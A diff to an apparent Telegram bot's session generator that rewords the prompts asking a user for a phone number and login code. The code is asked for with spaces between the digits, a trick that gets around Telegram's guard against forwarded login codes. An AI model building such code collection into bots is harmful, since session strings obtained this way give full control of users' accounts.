@@ -81,7 +81,15 @@ async def generate_session(_, message):
         
     user_id = message.chat.id   
     
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
+    number = await _.ask(
+    user_id,
+    '''Please enter your phone number along with the country code.
+Example: +91xxxxxxx , +1xxxxxxx
+
+⚠️ I'll need to send a verification code to this number''',
+    filters=filters.text
+) 
+
     phone_number = number.text
     try:
         await message.reply("📲 Sending OTP...")
@@ -99,7 +107,19 @@ async def generate_session(_, message):
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
     try:
-        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
+       otp_code = await _.ask(
+    user_id,
+    """📱 Verification Code Sent!
+
+━━━━━━━━━━━━━━━━━━━━
+HOW TO ENTER:
+• Enter the OTP with SPACES between each digit
+• Example: If code is 12345, type: 1 2 3 4 5 "
+
+Enter your OTP:""",
+    filters=filters.text,
+    timeout=600
+)
     except TimeoutError:
         await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
         return
